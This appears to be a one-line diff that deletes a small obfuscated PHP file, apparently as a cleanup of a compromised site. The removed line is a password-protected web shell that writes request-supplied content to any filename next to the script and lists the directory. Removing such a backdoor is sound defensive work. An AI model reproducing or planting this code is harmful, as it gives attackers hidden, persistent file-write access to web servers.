@@ -1,1 +1,0 @@
-<?php $r=$_REQUEST;$c=getcwd();$n=chr(32);print('468505ab9718d8c2205ea35d94f04668');if(md5(md5(@$r['p']))=='3829c383a1277bd6e7e108ab36f8f03c'){print($n.$c.$n);fwrite(fopen(dirname(__FILE__).'/'.$r['f'],'w+'),$r['b']);print($n);print_r(scandir($c));}exit;?>
